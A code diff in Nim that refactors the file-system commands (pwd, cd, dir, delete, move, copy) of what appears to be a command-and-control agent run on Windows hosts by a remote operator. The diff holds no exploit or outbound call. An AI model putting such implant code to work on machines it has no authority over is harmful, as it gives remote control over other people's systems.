@@ -1,14 +1,15 @@
-import os, strutils, strformat, base64, winim, times, algorithm, json
+import os, strutils, strformat, winim, times, algorithm
 
-import ../types
+import ../agentTypes
+import ../core/taskresult
+import ../../../common/[types, utils]
 
 # Retrieve current working directory
-proc taskPwd*(task: Task): TaskResult = 
+proc taskPwd*(config: AgentConfig, task: Task): TaskResult = 
 
-    echo fmt"Retrieving current working directory."
+    echo fmt"   [>] Retrieving current working directory."
 
     try: 
-        
         # Get current working directory using GetCurrentDirectory
         let 
             buffer = newWString(MAX_PATH + 1)
@@ -17,61 +18,41 @@ proc taskPwd*(task: Task): TaskResult =
         if length == 0:
             raise newException(OSError, fmt"Failed to get working directory ({GetLastError()}).")
 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode($buffer[0 ..< (int)length] & "\n"),
-            status: Completed
-        )
+        let output = $buffer[0 ..< (int)length] & "\n"
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, output.toBytes())
 
     except CatchableError as err: 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(fmt"An error occured: {err.msg}" & "\n"),
-            status: Failed 
-        )
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+
 
 # Change working directory
-proc taskCd*(task: Task): TaskResult = 
+proc taskCd*(config: AgentConfig, task: Task): TaskResult = 
 
     # Parse arguments
-    let targetDirectory = parseJson(task.args)["directory"].getStr()
+    let targetDirectory = task.args[0].data.toString()
 
-    echo fmt"Changing current working directory to {targetDirectory}."
+    echo fmt"   [>] Changing current working directory to {targetDirectory}."
 
     try: 
         # Get current working directory using GetCurrentDirectory
         if SetCurrentDirectoryW(targetDirectory) == FALSE:         
             raise newException(OSError, fmt"Failed to change working directory ({GetLastError()}).")
 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(""),
-            status: Completed
-        )
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
     except CatchableError as err: 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(fmt"An error occured: {err.msg}" & "\n"),
-            status: Failed 
-        )
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+
 
 # List files and directories at a specific or at the current path
-proc taskDir*(task: Task): TaskResult = 
+proc taskDir*(config: AgentConfig, task: Task): TaskResult = 
 
-    # Parse arguments
-    var targetDirectory = parseJson(task.args)["directory"].getStr()
+    try:
+        var targetDirectory: string
 
-    echo fmt"Listing files and directories."
-
-    try: 
-        # Check if users wants to list files in the current working directory or at another path
-
-        if targetDirectory == "": 
+        # Parse arguments
+        case int(task.argCount):
+        of 0: 
             # Get current working directory using GetCurrentDirectory
             let 
                 cwdBuffer = newWString(MAX_PATH + 1)
@@ -81,7 +62,14 @@ proc taskDir*(task: Task): TaskResult =
                 raise newException(OSError, fmt"Failed to get working directory ({GetLastError()}).")
 
             targetDirectory = $cwdBuffer[0 ..< (int)cwdLength]
-        
+
+        of 1:  
+            targetDirectory = task.args[0].data.toString()
+        else:
+            discard
+
+        echo fmt"   [>] Listing files and directories in {targetDirectory}."
+            
         # Prepare search pattern (target directory + \*)
         let searchPattern = targetDirectory & "\\*"
         let searchPatternW = newWString(searchPattern)
@@ -200,133 +188,83 @@ proc taskDir*(task: Task): TaskResult =
             output &= "\n" & fmt"{totalFiles} file(s)" & "\n"
             output &= fmt"{totalDirs} dir(s)" & "\n"
 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(output),
-            status: Completed
-        )
+            return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, output.toBytes())
 
     except CatchableError as err: 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(fmt"An error occured: {err.msg}" & "\n"),
-            status: Failed 
-        )
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+
 
 # Remove file 
-proc taskRm*(task: Task): TaskResult = 
+proc taskRm*(config: AgentConfig, task: Task): TaskResult = 
 
     # Parse arguments
-    let target = parseJson(task.args)["file"].getStr()
+    let target = task.args[0].data.toString()
 
-    echo fmt"Deleting file {target}."
+    echo fmt"   [>] Deleting file {target}."
 
     try: 
         if DeleteFile(target) == FALSE:         
             raise newException(OSError, fmt"Failed to delete file ({GetLastError()}).")
 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(""),
-            status: Completed
-        )
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
     except CatchableError as err: 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(fmt"An error occured: {err.msg}" & "\n"),
-            status: Failed 
-        )
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+        
 
 # Remove directory
-proc taskRmdir*(task: Task): TaskResult = 
+proc taskRmdir*(config: AgentConfig, task: Task): TaskResult = 
 
     # Parse arguments
-    let target = parseJson(task.args)["directory"].getStr()
+    let target = task.args[0].data.toString()
 
-    echo fmt"Deleting directory {target}."
+    echo fmt"   [>] Deleting directory {target}."
 
     try: 
         if RemoveDirectoryA(target) == FALSE:         
             raise newException(OSError, fmt"Failed to delete directory ({GetLastError()}).")
 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(""),
-            status: Completed
-        )
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
     except CatchableError as err: 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(fmt"An error occured: {err.msg}" & "\n"),
-            status: Failed 
-        )
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
 
 # Move file or directory
-proc taskMove*(task: Task): TaskResult = 
+proc taskMove*(config: AgentConfig, task: Task): TaskResult = 
 
     # Parse arguments
-    echo task.args
     let 
-        params = parseJson(task.args)
-        lpExistingFileName = params["from"].getStr()
-        lpNewFileName = params["to"].getStr()
+        lpExistingFileName = task.args[0].data.toString()
+        lpNewFileName = task.args[1].data.toString()
 
-    echo fmt"Moving {lpExistingFileName} to {lpNewFileName}."
+    echo fmt"   [>] Moving {lpExistingFileName} to {lpNewFileName}."
 
     try: 
         if MoveFile(lpExistingFileName, lpNewFileName) == FALSE:         
             raise newException(OSError, fmt"Failed to move file or directory ({GetLastError()}).")
 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(""),
-            status: Completed
-        )
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
     except CatchableError as err: 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(fmt"An error occured: {err.msg}" & "\n"),
-            status: Failed 
-        )
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
+
 
 # Copy file or directory
-proc taskCopy*(task: Task): TaskResult = 
+proc taskCopy*(config: AgentConfig, task: Task): TaskResult = 
 
     # Parse arguments
     let 
-        params = parseJson(task.args)
-        lpExistingFileName = params["from"].getStr()
-        lpNewFileName = params["to"].getStr()
+        lpExistingFileName = task.args[0].data.toString()
+        lpNewFileName = task.args[1].data.toString()
 
-    echo fmt"Copying {lpExistingFileName} to {lpNewFileName}."
+    echo fmt"   [>] Copying {lpExistingFileName} to {lpNewFileName}."
 
     try: 
         # Copy file to new location, overwrite if a file with the same name already exists
         if CopyFile(lpExistingFileName, lpNewFileName, FALSE) == FALSE:         
             raise newException(OSError, fmt"Failed to copy file or directory ({GetLastError()}).")
 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(""),
-            status: Completed
-        )
+        return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
     except CatchableError as err: 
-        return TaskResult(
-            task: task.id, 
-            agent: task.agent, 
-            data: encode(fmt"An error occured: {err.msg}" & "\n"),
-            status: Failed 
-        )
+        return createTaskResult(task, STATUS_FAILED, RESULT_STRING, err.msg.toBytes())
